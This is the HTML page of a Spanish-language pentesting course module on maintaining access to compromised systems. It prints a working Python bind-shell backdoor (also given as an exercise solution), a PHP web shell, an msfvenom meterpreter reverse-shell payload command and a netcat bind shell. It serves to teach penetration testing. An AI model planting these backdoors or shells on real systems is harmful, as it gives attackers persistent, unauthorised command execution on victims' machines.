<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mantenimiento del Acceso</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Construyendo la sociedad de hoy y del mañana</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
										<a href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">EN</a></b>
				|
				<b class="px-2">ES</b>
				|
				<a href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">CA</a>
								</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">El Proyecto</a>
				<a href="/about">Sobre nosotros</a>
				<a href="/contribute">Contribuir</a>
				<a href="/donate">Donaciones</a>
				<a href="/licence">Licencia</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
								<div class='row navigation'>
	<div class='col-2'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegios">&#x25C4;Anterior</a>
			</div>
	<div class='col-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Mantenimiento del Acceso</h2></a>
			</div>
	<div class='col-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Huellas">Siguiente &#x25BA;</a>
			</div>
</div>
<div class='content'><p>El mantenimiento del acceso es una fase crucial en el proceso de post-explotación durante una prueba de penetración. Una vez que un pentester ha logrado comprometer un sistema, es esencial asegurar un acceso continuo para realizar análisis adicionales, recopilar más datos y, si es necesario, realizar tareas de escalada de privilegios. Este módulo cubrirá las técnicas y herramientas utilizadas para mantener el acceso a un sistema comprometido.</p>
</div><h1>Objetivos de Aprendizaje</h1>
<div class='content'><p>Al finalizar este módulo, los estudiantes serán capaces de:</p>
<ol>
<li>Comprender la importancia del mantenimiento del acceso en el pentesting.</li>
<li>Identificar y utilizar diversas técnicas para mantener el acceso a sistemas comprometidos.</li>
<li>Implementar herramientas y métodos para asegurar un acceso persistente.</li>
<li>Reconocer y mitigar los riesgos asociados con el mantenimiento del acceso.</li>
</ol>
</div><h1>Conceptos Clave</h1>
<div class='content'></div><h2>1. ¿Qué es el Mantenimiento del Acceso?</h2>
<div class='content'><p>El mantenimiento del acceso se refiere a las técnicas y métodos utilizados por los pentesters para asegurar que puedan volver a acceder a un sistema comprometido en el futuro. Esto es crucial para realizar análisis continuos y recopilar más información sin tener que comprometer el sistema nuevamente.</p>
</div><h2>2. Técnicas Comunes de Mantenimiento del Acceso</h2>
<div class='content'><p>A continuación, se describen algunas de las técnicas más comunes utilizadas para mantener el acceso:</p>
<h4>a. Backdoors (Puertas Traseras)</h4>
<p>Las backdoors son programas o scripts que permiten a un atacante acceder a un sistema comprometido sin pasar por los mecanismos de autenticación normales.</p>
<p><strong>Ejemplo de Backdoor en Python:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGNyZWF0ZV9iYWNrZG9vcigpOgogICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgIHMuYmluZCgoIjAuMC4wLjAiLCA5OTk5KSkKICAgIHMubGlzdGVuKDUpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNsaWVudF9zb2NrZXQsIGFkZHIgPSBzLmFjY2VwdCgpCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgY29tbWFuZCA9IGNsaWVudF9zb2NrZXQucmVjdigxMDI0KS5kZWNvZGUoKQogICAgICAgICAgICBpZiBjb21tYW5kLmxvd2VyKCkgPT0gImV4aXQiOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoY29tbWFuZCkKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kKG91dHB1dC5lbmNvZGUoKSkKICAgICAgICBjbGllbnRfc29ja2V0LmNsb3NlKCkKCmNyZWF0ZV9iYWNrZG9vcigp"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import socket
import subprocess

def create_backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((&quot;0.0.0.0&quot;, 9999))
    s.listen(5)
    while True:
        client_socket, addr = s.accept()
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == &quot;exit&quot;:
                break
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())
        client_socket.close()

create_backdoor()</pre></div><div class='content'><p><strong>Explicación:</strong></p>
<ul>
<li>Este script crea un socket que escucha en el puerto 9999.</li>
<li>Cuando se conecta un cliente, el script recibe comandos y ejecuta esos comandos en el sistema comprometido.</li>
<li>El resultado del comando se envía de vuelta al cliente.</li>
</ul>
<h4>b. Rootkits</h4>
<p>Los rootkits son conjuntos de herramientas diseñadas para ocultar la presencia de un atacante en un sistema comprometido. Pueden modificar el sistema operativo para ocultar archivos, procesos y conexiones de red.</p>
<h4>c. Web Shells</h4>
<p>Las web shells son scripts que permiten a un atacante ejecutar comandos en un servidor web comprometido. Son comunes en ataques a aplicaciones web.</p>
<p><strong>Ejemplo de Web Shell en PHP:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsKICAgIHN5c3RlbSgkY21kKTsKfQo/Pg=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?&gt;</pre></div><div class='content'><p><strong>Explicación:</strong></p>
<ul>
<li>Este script PHP ejecuta comandos del sistema operativo recibidos a través de una solicitud HTTP.</li>
<li>El parámetro 'cmd' en la solicitud contiene el comando a ejecutar.</li>
</ul>
</div><h2>3. Herramientas para el Mantenimiento del Acceso</h2>
<div class='content'><p>Existen varias herramientas que los pentesters pueden utilizar para mantener el acceso a sistemas comprometidos:</p>
<h4>a. Metasploit Framework</h4>
<p>Metasploit es una de las herramientas más populares para el pentesting. Incluye módulos para crear backdoors y mantener el acceso.</p>
<p><strong>Ejemplo de uso de Metasploit para crear una backdoor:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("bXNmdmVub20gLXAgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcCBMSE9TVD08SVA+IExQT1JUPTxQT1JUPiAtZiBleGUgPiBiYWNrZG9vci5leGU="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; backdoor.exe</pre></div><div class='content'><p><strong>Explicación:</strong></p>
<ul>
<li><code>msfvenom</code> se utiliza para generar payloads.</li>
<li><code>-p</code> especifica el payload a utilizar (en este caso, un reverse TCP meterpreter).</li>
<li><code>LHOST</code> y <code>LPORT</code> especifican la IP y el puerto para la conexión inversa.</li>
<li><code>-f exe</code> indica que el formato del archivo de salida será un ejecutable de Windows.</li>
</ul>
<h4>b. Netcat</h4>
<p>Netcat es una herramienta de red que puede ser utilizada para crear conexiones de red y mantener el acceso.</p>
<p><strong>Ejemplo de uso de Netcat para crear una backdoor:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("bmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaA=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>nc -lvp 4444 -e /bin/bash</pre></div><div class='content'><p><strong>Explicación:</strong></p>
<ul>
<li><code>nc</code> es el comando para Netcat.</li>
<li><code>-lvp</code> indica que Netcat debe escuchar en modo verbose en el puerto 4444.</li>
<li><code>-e /bin/bash</code> ejecuta una shell bash cuando se establece una conexión.</li>
</ul>
</div><h1>Ejercicio Práctico</h1>
<div class='content'><p><strong>Objetivo:</strong> Crear y utilizar una backdoor simple en Python para mantener el acceso a un sistema comprometido.</p>
<p><strong>Instrucciones:</strong></p>
<ol>
<li>Escribe un script en Python que cree una backdoor similar al ejemplo proporcionado.</li>
<li>Ejecuta el script en una máquina virtual o entorno controlado.</li>
<li>Conéctate a la backdoor desde otra máquina utilizando Netcat.</li>
<li>Ejecuta comandos en la máquina comprometida a través de la backdoor.</li>
</ol>
<p><strong>Solución:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGNyZWF0ZV9iYWNrZG9vcigpOgogICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgIHMuYmluZCgoIjAuMC4wLjAiLCA5OTk5KSkKICAgIHMubGlzdGVuKDUpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNsaWVudF9zb2NrZXQsIGFkZHIgPSBzLmFjY2VwdCgpCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgY29tbWFuZCA9IGNsaWVudF9zb2NrZXQucmVjdigxMDI0KS5kZWNvZGUoKQogICAgICAgICAgICBpZiBjb21tYW5kLmxvd2VyKCkgPT0gImV4aXQiOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoY29tbWFuZCkKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kKG91dHB1dC5lbmNvZGUoKSkKICAgICAgICBjbGllbnRfc29ja2V0LmNsb3NlKCkKCmNyZWF0ZV9iYWNrZG9vcigp"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import socket
import subprocess

def create_backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((&quot;0.0.0.0&quot;, 9999))
    s.listen(5)
    while True:
        client_socket, addr = s.accept()
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == &quot;exit&quot;:
                break
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())
        client_socket.close()

create_backdoor()</pre></div><div class='content'><p><strong>Explicación:</strong></p>
<ul>
<li>El script crea un socket que escucha en el puerto 9999.</li>
<li>Cuando se conecta un cliente, el script recibe comandos y ejecuta esos comandos en el sistema comprometido.</li>
<li>El resultado del comando se envía de vuelta al cliente.</li>
</ul>
</div><h1>Retroalimentación y Consejos</h1>
<div class='content'><ul>
<li><strong>Errores Comunes:</strong> Asegúrate de que el firewall no esté bloqueando el puerto utilizado por la backdoor. Además, verifica que el script tenga permisos para ejecutar comandos.</li>
<li><strong>Consejo:</strong> Siempre realiza pruebas en entornos controlados y con permisos adecuados. El uso indebido de estas técnicas puede tener consecuencias legales y éticas.</li>
</ul>
</div><h1>Conclusión</h1>
<div class='content'><p>El mantenimiento del acceso es una fase crítica en el pentesting que permite a los pentesters realizar análisis continuos y recopilar más información sin tener que comprometer el sistema nuevamente. En este módulo, hemos explorado diversas técnicas y herramientas para mantener el acceso, así como ejemplos prácticos y ejercicios para reforzar los conceptos aprendidos. En el próximo módulo, nos enfocaremos en la cobertura de huellas, una fase igualmente importante para asegurar que las actividades del pentester no sean detectadas.</p>
</div><div class='row navigation'>
	<div class='col-2'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegios">&#x25C4;Anterior</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Huellas">Siguiente &#x25BA;</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Publicidad</h1>
			<p>Este espacio está destinado a publicidad.</p>
			<p>Si quieres ser patrocinador, contáctanos para incluir enlaces en esta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>¡Gracias por colaborar!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Todos los derechos reservados</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Aceptar</a>
    <a href="/cookies">Mas información</a>
</div>	

	</div>    
</body>
</html>
